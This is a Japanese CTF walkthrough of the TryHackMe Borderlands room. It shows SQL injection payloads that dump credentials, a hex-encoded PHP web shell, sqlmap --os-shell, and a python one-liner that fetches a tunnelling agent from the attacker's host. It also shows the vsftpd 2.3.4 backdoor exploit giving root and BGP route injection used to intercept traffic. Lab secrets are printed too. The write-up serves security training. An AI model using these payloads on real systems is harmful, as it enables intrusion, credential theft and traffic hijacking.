# Borderlands CTF

https://tryhackme.com/room/borderlands

## Enumeration

```shell
TARGET=10.145.155.50
sudo bash -c "echo $TARGET   border.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE  SERVICE    REASON
22/tcp   open   ssh        syn-ack ttl 64
80/tcp   open   http       syn-ack ttl 63
8080/tcp closed http-proxy reset ttl 63
```

SSH, HTTP。8080が見えているのは謎。

```sh
root@ip-10-145-113-165:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.145.155.50
+ Target Hostname:    border.thm
+ Target Port:        80
+ Start Time:         2026-04-07 05:49:57 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /.git/index, fields: 0x5d8215f6 0x3ba 
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-04-07 05:49:59 (GMT1) (2 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

/.git ディレクトリがある。

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.145.155.50/ ----
+ http://10.145.155.50/.git/HEAD (CODE:200|SIZE:23)                                                                     
+ http://10.145.155.50/index.php (CODE:200|SIZE:15227)                                                                  
+ http://10.145.155.50/info.php (CODE:200|SIZE:80588) 
```

```sh
dirsearch -u http://$TARGET -e php,txt

[05:52:51] 200 -   15B  - /api.php
[05:53:07] 302 -    0B  - /home.php  ->  index.php
[05:53:10] 200 -   79KB - /info.php
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 64 -k

/api.php              (Status: 200) [Size: 15]
/functions.php        (Status: 200) [Size: 0]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/index.php            (Status: 200) [Size: 15227]
/info.php             (Status: 200) [Size: 80560]
```

## git

gitリポジトリをダンプ

```sh
/home/kali/tools/GitTools/Dumper/gitdumper.sh http://border.thm/.git/ ./git
```

```sh
$ git status                                                                                 
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    CTX_WSUSpect_White_Paper.pdf
        deleted:    Context_Red_Teaming_Guide.pdf
        deleted:    Context_White_Paper_Pen_Test_101.pdf
        deleted:    Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
        deleted:    Glibc_Adventures-The_Forgotten_Chunks.pdf
        deleted:    api.php
        deleted:    functions.php
        deleted:    home.php
        deleted:    index.php
        deleted:    info.php

no changes added to commit (use "git add" and/or "git commit -a")
```

history

```sh
$ git log   
commit 6db3cf70b469de942f2f529166088cdfbbd5f764 (HEAD -> master)
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:44:31 2019 +0100

    added mobile apk for beta testing.

commit fee5595bb2ba1d1ab005ec3de98367fe5d021e9f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:43:26 2019 +0100

    added white paper pdf's

commit 04f1f411857cc972ae8ed5efcffa298f5f6168fb
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:42:12 2019 +0100

    added theme

commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data

commit 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:40:28 2019 +0100

    added basic prototype of api gateway

commit 93bab0a450caaa8c4d2632703636eccc69062bb4
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:33:58 2019 +0100

    added under construction page

commit 152b2d9976cd37a68fd462af8e4ce21356b5485e
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:31:11 2019 +0100

    created repo
```

`removed sensitive data` のdiff

```sh
$ diff -r ../4-b2f776a52fe81a731c6c0fa896e7f9548aafceab ./
diff '--color=auto' -r ../4-b2f776a52fe81a731c6c0fa896e7f9548aafceab/api.php ./api.php
5c5
< if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
---
> if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4Tx[REDACTED]"))
```

functions.php

```php
$ cat functions.php
<?php

function setup_db_connection()
{
    $db_servername = "localhost";
    $db_username = "root";
    $db_password = "CCv4@he2MaHbIP7mB89TNKdei0VZ0Y";
    $db_name = "myfirstwebsite";
```

```php
function ShowLoggedOutView ($conn)
{
    echo ("<p>Welcome to our site. Please bear with us whilst we get everything up and running.</p>");
    
    /*
    $options = [
        'salt' => 'wWeyIzGcD7TVwZ7y7d3UCRIMYK'
    ];
    echo password_hash("hello", PASSWORD_BCRYPT, $options);
    */

    ShowDocuments($conn);
```

```php
function CheckLogon ($conn)
{
    $options = [
        'salt' => 'wWeyIzGcD7TVwZ7y7d3UCRIMYK'
    ];
    //do logon check
    $username = $_POST['username'];
    $password = password_hash($_POST['password'], PASSWORD_BCRYPT, $options);

    $stmt = $conn->prepare("SELECT userid FROM users WHERE username=? AND password=?");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $stmt -> store_result();
```

home.php

```php
echo ("<ul>");
while ($stmt -> fetch()) {
    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEB[REDACTED]">'.$document_name.'</a></li>');
    $resultsArray[] = array("documentid" => $documentid, "documentname" => $document_name, "location" => $location);
}
echo ("</ul>");
```

## apk

jadx-gui で開く。

```java
@Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main2);
    this.apiKey = decrypt(getString(R.string.encrypted_api_key), "#TODO");
    this.apiPath = "/api.php?documentid={}&apikey=" + this.apiKey;
}

protected String decrypt(String encrypted_key, String encryption_key) {
    return "NOT_IMPLEMENTED";
}
```

string.xml

```xml
<string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
```

復号後の先頭20文字が ANDVOWLDLAS5Q8OQZ2tu であることは分かっている。  
数字は暗号前後でそのまま残っている。また、大文字は大文字、小文字は小文字のまま。

```
平文
ANDVOWLDLAS5Q8OQZ2tu
暗号文
CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo
```

1文字目からシフト量を計算すると、  
2, 14, 13, 19, 4, 23, 19, 2, 14 ・・・  
0 を A とすると、CONTEXT がVigenere暗号のキーとなる。

## Web

```
News: We are looking for Android BETA testers for the new Mobile App Prototype, please download from here.

Welcome to our site. Please bear with us whilst we get everything up and running.

Below you will find a list of documents that are available to download

    Context_Red_Teaming_Guide.pdf
    Context_White_Paper_Pen_Test_101.pdf
    CTX_WSUSpect_White_Paper.pdf
    Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
    Glibc_Adventures-The_Forgotten_Chunks.pdf
```

非ログイン状態では下記が実行される。これは、api.php からパラメータを与えて実行可能。

```php
function GetDocumentDetails($conn, $documentid)
{
    $sql = "select documentid, documentname, location from documents where documentid=".$documentid;
    //echo $sql;
    $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));

    if (mysqli_num_rows($result) === 1) {
        return mysqli_fetch_assoc($result);
    } else {
        return null;
    }
}
```

### SQLi

SQLインジェクションを実行。

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" union select 1,2,3-- -
```

下記のように表示される。

```
Document ID: 1
Document Name: 2
Document Location: 3
```

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" union select 1,2,database()-- -
```

```
myfirstwebsite
```


```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'myfirstwebsite'-- -
```

```
documents,users
```

#### usersテーブル

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- -
```

```
userid,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users-- -
```

```
billg:$2y$10$wWeyIzG[REDACTED]
```

billg ユーザーのパスワードハッシュを入手した。  
BCRYPT は厳しいかと思ったが、hashcat ですぐにクラック成功してパスワード判明。

#### documentsテーブル

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'documents'-- -
```

```
documentid,documentname,location
```

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,group_concat(documentid,':',documentname,':',location SEPARATOR '<br>') FROM documents-- -
```

```
1:Context_Red_Teaming_Guide.pdf:Context_Red_Teaming_Guide.pdf
2:Context_White_Paper_Pen_Test_101.pdf:Context_White_Paper_Pen_Test_101.pdf
3:CTX_WSUSpect_White_Paper.pdf:CTX_WSUSpect_White_Paper.pdf
4:Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf:Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
5:Glibc_Adventures-The_Forgotten_Chunks.pdf:Glibc_Adventures-The_Forgotten_Chunks.pdf
```

### home.php

ログインしたらhome.php の画面が表示された。

PHPファイルアップロードを試みたが、アップロードできなかった。

```sh
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

コメントアウトされているupdate機能が生きている可能性を考えたが、更新されなかった。

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid=1&newname=abc
```

コマンド実行は無効。

```
http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,sys_eval('whoami')-- -

http://border.thm/api.php?apikey=WEB[REDACTED]&documentid="XXX" UNION SELECT 1,2,sys_exec('whoami')-- -
```

sqlmap の --os-shell でシェルを取れた。

```sh
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] 

command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

```sh
os-shell> cat /var/www/flag.txt
do you want to retrieve the command standard output? [Y/n/a] 

command standard output: '{FLAG:Webapp:[REDACTED]}'
```

## router1

問題文によると、次の目標はルーター１。  
IPアドレスが分からないので、ネットワークを調査する必要がある。

```sh
os-shell> hostname
do you want to retrieve the command standard output? [Y/n/a] 

command standard output: 'app.ctx.ctf'

os-shell> cat /etc/hosts
do you want to retrieve the command standard output? [Y/n/a] 

command standard output:
---
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.18.0.2      app.ctx.ctf app
172.16.1.10     app.ctx.ctf app
---

os-shell> ip a s
do you want to retrieve the command standard output? [Y/n/a] 

command standard output:
---
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
14: eth0@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
22: eth1@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
    link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
       valid_lft forever preferred_lft forever
---
```

172.18.0.2/16、172.16.1.10/24　の2つのネットワークがある。

ssh 接続できないので、sshuttle は使えない。ligolo でトンネリングする。

```sh
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.128.106:8000/agent', '/tmp/agent')"
```

```sh
/tmp/agent -ignore-cert -connect 192.168.128.106:11601
```

```sh
$ sudo ./proxy -selfcert
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0006] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0006] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0006] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                  
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                  
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                   
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                    
        /____/                          /____/                                                                     
                                                                                                                   
  Made in France ♥            by @Nicocha30!                                                                       
  Version: 0.8.2                                                                                                   
                                                                                                                   
ligolo-ng » INFO[0106] Agent joined.                                 id=0242ac120002 name=www-data@app.ctx.ctf remote="10.144.153.129:58768"                                                                                          
ligolo-ng » ifcreate --name ligolo
INFO[0132] Creating a new ligolo interface...           
INFO[0132] Interface created!                           
ligolo-ng » tunnel_start
error: please, select an agent using the session command
ligolo-ng » session
? Specify a session : 1 - www-data@app.ctx.ctf - 10.144.153.129:58768 - 0242ac120002
[Agent : www-data@app.ctx.ctf] » tunnel_start
INFO[0165] Starting tunnel to www-data@app.ctx.ctf (0242ac120002) 
[Agent : www-data@app.ctx.ctf] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth0                           │
│ Hardware MAC │ 02:42:ac:12:00:02              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.18.0.2/16                  │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth1                           │
│ Hardware MAC │ 02:42:ac:10:01:0a              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.1.10/24                 │
└──────────────┴────────────────────────────────┘
[Agent : www-data@app.ctx.ctf] » add_route --name ligolo --route 172.18.0.0/24
INFO[0217] Route created.
```

172.18.0.1、172.18.0.2 で開いているポートを発見。  
ブラウザ表示したら、CONTEXTの同じログイン画面が表示された。  
SQLiでシェルを取ってみたら、どちらもアプリサーバーと同じマシンだった。Dockerホストとゲストの関係と思われる。

```sh
$ nmap 172.18.0.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 01:18 EDT
Nmap scan report for 172.18.0.0
Host is up (0.00019s latency).
All 1000 scanned ports on 172.18.0.0 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.18.0.1
Host is up (0.00018s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap scan report for 172.18.0.2
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
```

172.16.1.10/24 ネットワークで、起動しているホストが２つあった。

```sh
$ nmap 172.16.1.0/24 

Nmap scan report for 172.16.1.10
Host is up (0.14s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.1.128
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
179/tcp  open  bgp
2601/tcp open  zebra
2605/tcp open  bgpd
```

```sh
$ nmap -sV -p21,179,2601,2605 172.16.1.128
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-08 04:22 EDT
Nmap scan report for 172.16.1.128
Host is up (0.068s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
179/tcp  open  tcpwrapped
2601/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
2605/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
Service Info: OS: Unix
```

この vsftpd のバージョンには、バックドアコマンド実行の脆弱性がある。

```sh
$ searchsploit vsftpd 2.3.4            
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

telnetlib を telnetlib3 に変更して実行。

```sh
$ python ./49757.py 172.16.1.128
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

フラグゲット。

```sh
ls -al /root
total 148
drwx------    1 root     root          4096 Oct 11  2019 .
drwxr-xr-x    1 root     root          4096 Apr  8 05:31 ..
-rw-rw-r--    1 1001     1001            48 Sep 18  2019 flag.txt
-rwxr-xr-x    1 1001     1001        139072 Sep  6  2019 vsftpd
cat /root/flag.txt
{FLAG:Router1:[REDACTED]}
```

## flag_server to flag_client over UDP

現状、flag_server と flag_client らしきものは発見できていない。  
ヒントによると、`try add missing routes` とのこと。

ルーターのhostsを見たら、172.16.31.0、172.16.12.0 ネットワークがあった。

```sh
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.16.31.101   router1.ctx.ctf router1
172.16.12.101   router1.ctx.ctf router1
172.16.1.128    router1.ctx.ctf router1
```

ルーター１上でagentを起動しようとすると、仮想メモリ制限が厳しすぎるため実行時エラーとなった。

```sh
./agent -ignore-cert -connect 172.16.1.10:11601
fatal error: failed to reserve page summary memory
```

ダブルピボットを実行するなら chisel 等に切り替える必要があるが、ルーター１でtcpdumpを実行。意味を読み取れそうなデータは出ていないが、受信データの表示はできる。

```sh
tcpdump -i eth0 -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
05:55:47.270591 IP hackback_router2_1.hackback_r_1_2.179 > router1.ctx.ctf.44390: Flags [P.], seq 2091744154:2091744173, ack 2498880857, win 227, options [nop,nop,TS val 1155379 ecr 1140389], length 19: BGP
E..Gb.@....)...f...e...f|.{....Y....q%.....
...3..f....................
05:55:47.270596 IP router1.ctx.ctf.44390 > hackback_router2_1.hackback_r_1_2.179: Flags [.], ack 19, win 229, options [nop,nop,TS val 1155379 ecr 1155379], length 0
E..4..@...?....e...f.f.....Y|.{.....q......
...3...3
05:55:47.270655 IP router1.ctx.ctf.44390 > hackback_router2_1.hackback_r_1_2.179: Flags [P.], seq 1:20, ack 19, win 229, options [nop,nop,TS val 1155379 ecr 1155379], length 19: BGP
E..G..@...?....e...f.f.....Y|.{.....q%.....
...3...3...................
05:55:47.309166 IP hackback_router2_1.hackback_r_1_2.179 > router1.ctx.ctf.44390: Flags [.], ack 20, win 227, options [nop,nop,TS val 1155389 ecr 1155379], length 0
E..4b.@....;...f...e...f|.{....l....q......
...=...3
05:55:52.281154 ARP, Request who-has hackback_router2_1.hackback_r_1_2 tell router1.ctx.ctf, length 28
.........B...e...e.........f
05:55:52.281183 ARP, Reply hackback_router2_1.hackback_r_1_2 is-at 02:42:ac:10:0c:66 (oui Unknown), length 28
.........B...f...f.B.
```

ここからは全く分からずウォークスルーを見ながら実行。

vtysh は、Linux上で動いているルーターソフト（ここではQuagga）を操作するための専用シェルを起動している。

```sh
vtysh

Hello, this is Quagga (version 1.2.4).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

router1.ctx.ctf# 
```

172.16.2.0/25、172.16.3.0/25 があて先のパケットを自分のところに来させるようにしている。

```sh
router1.ctx.ctf# config terminal
config terminal
router1.ctx.ctf(config)# router bgp 60001
router bgp 60001
router1.ctx.ctf(config-router)# network 172.16.2.0/25
network 172.16.2.0/25
router1.ctx.ctf(config-router)# network 172.16.3.0/25
network 172.16.3.0/25
router1.ctx.ctf(config-router)# end
end
router1.ctx.ctf# clear ip bgp *
clear ip bgp *
router1.ctx.ctf# exit
exit
```

ちなみに、60001という数字は、このルーターが所属しているネットワークのグループ識別番号を表す。下記のように確認可能。

```sh
router1.ctx.ctf# show running-config

...
!
router bgp 60001
 bgp router-id 1.1.1.1
 network 172.16.1.0/24
 network 172.16.2.0/25
 network 172.16.3.0/25
 neighbor 172.16.12.102 remote-as 60002
 neighbor 172.16.12.102 weight 100
 neighbor 172.16.12.102 soft-reconfiguration inbound
 neighbor 172.16.12.102 prefix-list LocalNet in
 neighbor 172.16.31.103 remote-as 60003
 neighbor 172.16.31.103 weight 100
 neighbor 172.16.31.103 soft-reconfiguration inbound
 neighbor 172.16.31.103 prefix-list LocalNet in
!
```

また、ネットワークアドレスは下記のように取得できた。

```sh
ip route show
default via 172.16.12.1 dev eth0 
172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.128 
172.16.2.0/24 via 172.16.12.102 dev eth0 proto zebra metric 20 
172.16.3.0/24 via 172.16.31.103 dev eth2 proto zebra metric 20 
172.16.12.0/24 dev eth0 proto kernel scope link src 172.16.12.101 
172.16.31.0/24 dev eth2 proto kernel scope link src 172.16.31.101
```

このような感じでフラグが表示された。

```sh
06:10:36.083876 IP 172.16.3.10.52787 > 172.16.2.10.4444: UDP, length 44
E..H.U@.>.%....
...
.3.\.4]z{FLAG:UDP:[REDACTED]}

06:11:04.107634 IP 172.16.3.10.5555 > 172.16.2.10.35029: Flags [FP.], seq 18:45, ack 1, win 227, options [nop,nop,TS val 1384588 ecr 1384588], length 27
E..O .@.>......
...
....i...+.......]v.....
.. ... .[REDACTED]}
```

## 振り返り

- 
- vtysh は初見。ルーターのコマンドはほぼ何の知識も無いので勉強になった。

## Tags

#tags:SQLインジェクション #tags:ligolo #tags:vsftpd脆弱性 #tags:ルーター #tags:vtysh #tags:BGPプロトコル
